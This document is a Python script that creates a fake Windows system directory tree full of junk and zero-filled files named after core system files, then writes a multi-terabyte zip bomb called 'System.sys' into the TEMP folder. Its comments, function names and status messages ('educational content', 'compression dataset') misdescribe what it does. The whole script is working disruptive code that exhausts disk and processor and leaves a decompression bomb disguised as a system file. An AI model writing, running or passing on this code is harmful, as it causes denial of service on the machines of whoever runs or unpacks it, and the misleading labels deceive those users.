import os, zipfile, ctypes, shutil, tempfile, random, string

def generate_educational_content():
    return "".join(random.choices(string.printable, k=2048))

system_dirs = [
    "Windows\\System32\\config",
    "Windows\\System32\\drivers",
    "Windows\\System32\\spool",
    "Windows\\System32\\wbem",
    "Windows\\System32\\IME",
    "Windows\\System32\\CatRoot",
    "Windows\\System32\\Com",
    "Windows\\System32\\ReinstallBackups",
    "Windows\\System32\\DllCache",
    "Windows\\System32\\GroupPolicy",
    "Windows\\system",
    "Windows\\security",
    "Windows\\srchasst",
    "Windows\\repair",
    "Windows\\inf",
    "Windows\\Help",
    "Windows\\Config",
    "Windows\\msagent",
    "Windows\\Cursors",
    "Windows\\Media",
    "Windows\\Mui",
    "Windows\\addins",
    "Windows\\Driver Cache\\i386",
    "Windows\\TEMP",
    "Windows\\twain_32",
    "Windows\\AppPatch",
    "Windows\\Debug",
    "Windows\\Resources\\Themes",
    "Windows\\WinSxS",
    "Windows\\ime",
    "Windows\\PCHealth\\HelpCtr\\Binaries",
    "Windows\\Prefetch",
    "Windows\\Fonts",
    "Program Files\\Common Files",
    "Program Files\\Internet Explorer",
    "Program Files\\Windows Media Player",
    "Program Files (x86)\\Common Files",
    "Users\\Default\\AppData\\Roaming",
    "Users\\Default\\AppData\\Local\\Temp",
    "Users\\Public\\Documents",
    "Users\\Public\\Music",
    "Users\\Public\\Pictures",
    "Users\\Public\\Videos"
]

for d in system_dirs:
    os.makedirs(d, exist_ok=True)
    for f in ["sys.ini", "config.bin", "data.tmp", "cache.dat", "settings.reg"]:
        try:
            with open(os.path.join(d, f), "w") as stub:
                stub.write(generate_educational_content())
        except:
            pass

for d in system_dirs:
    for i in range(3):
        sub = os.path.join(d, f"sub_{i}")
        os.makedirs(sub, exist_ok=True)
        for f in ["log.txt", "dump.bin", "temp.dat"]:
            try:
                with open(os.path.join(sub, f), "w") as stub:
                    stub.write("".join(random.choices(string.printable, k=8192)))
            except:
                pass

large_files = [
    "Windows\\System32\\ntoskrnl.bak",
    "Windows\\System32\\hal.dll.bak",
    "Windows\\System32\\kernel32.dll.bak",
    "Windows\\System32\\winload.efi.bak",
    "Windows\\System32\\winload.exe.bak",
    "Windows\\System32\\ntdll.dll.bak",
    "Windows\\System32\\drivers\\ntfs.sys.bak",
    "Windows\\System32\\drivers\\tcpip.sys.bak",
    "Windows\\System32\\drivers\\usbhub.sys.bak",
    "Windows\\System32\\drivers\\disk.sys.bak",
    "Windows\\System32\\drivers\\volmgr.sys.bak",
    "Windows\\System32\\drivers\\fvevol.sys.bak",
    "Windows\\System32\\drivers\\rdbss.sys.bak",
    "Windows\\System32\\drivers\\mrxsmb.sys.bak",
    "Windows\\System32\\drivers\\mup.sys.bak",
    "Windows\\System32\\drivers\\nsiproxy.sys.bak",
    "Windows\\System32\\config\\software.bak",
    "Windows\\System32\\config\\system.bak",
    "Windows\\System32\\config\\sam.bak",
    "Windows\\System32\\config\\security.bak",
    "Windows\\System32\\config\\default.bak",
    "Windows\\System32\\config\\BCD-Template.bak",
    "Windows\\System32\\config\\RegBack\\software.bak",
    "Windows\\System32\\config\\RegBack\\system.bak",
    "Windows\\System32\\config\\RegBack\\sam.bak",
    "Windows\\System32\\config\\RegBack\\security.bak",
    "Windows\\System32\\config\\RegBack\\default.bak",
    "Windows\\System32\\catroot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\catdb.bak",
    "Windows\\System32\\catroot\\{127D0A1D-4EF2-11D1-8608-00C04FC295EE}\\catdb.bak",
    "Windows\\System32\\wbem\\cimwin32.bak",
    "Windows\\System32\\wbem\\wmiutils.bak",
    "Windows\\System32\\wbem\\wbemcore.bak",
    "Windows\\System32\\wbem\\wbemprox.bak",
    "Windows\\System32\\wbem\\wbemsvc.bak",
    "Windows\\System32\\wbem\\fastprox.bak",
    "Windows\\System32\\wbem\\repdrvfs.bak",
    "Windows\\System32\\wbem\\ntevt.bak",
    "Windows\\System32\\wbem\\wmiprvse.bak",
    "Windows\\System32\\wbem\\wmiaprpl.bak",
    "Windows\\System32\\wbem\\wmic.exe.bak",
    "Windows\\System32\\wbem\\wmiprop.dll.bak",
    "Windows\\System32\\spool\\drivers\\x64\\3\\printconfig.bak",
    "Windows\\System32\\spool\\drivers\\x64\\3\\printerdrv.bak",
    "Windows\\System32\\spool\\drivers\\x64\\3\\unidrv.bak",
    "Windows\\System32\\spool\\drivers\\x64\\3\\pclxl.bak",
    "Windows\\System32\\spool\\drivers\\x64\\3\\pscript.bak",
    "Windows\\System32\\spool\\drivers\\x64\\3\\xmlprint.bak",
    "Windows\\System32\\drivers\\etc\\hosts.bak",
    "Windows\\System32\\drivers\\etc\\networks.bak",
    "Windows\\System32\\drivers\\etc\\protocol.bak",
    "Windows\\System32\\drivers\\etc\\services.bak",
    "Windows\\System32\\drivers\\etc\\lmhosts.bak"
]

chunk_3mb = b"\x00" * (3 * 1024 * 1024)

for path in large_files:
    try:
        full = os.path.join(os.getcwd(), path)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "wb") as f:
            f.write(chunk_3mb)
    except:
        pass

temp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")
os.chdir(temp_dir)

chunk_size = 1024 * 1024
iterations = 7173 * 1024

with open("temp_chunk.tmp", "wb") as f:
    f.write(b"\x00" * chunk_size)

with zipfile.ZipFile("System.sys", "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
    with zf.open("data.bin", "w", force_zip64=True) as z:
        for _ in range(iterations):
            with open("temp_chunk.tmp", "rb") as tf:
                z.write(tf.read())

os.remove("temp_chunk.tmp")

print("[OK] System structure initialized")
print("[OK] Educational compression dataset created")
print("[OK] Output: " + os.path.join(temp_dir, "System.sys"))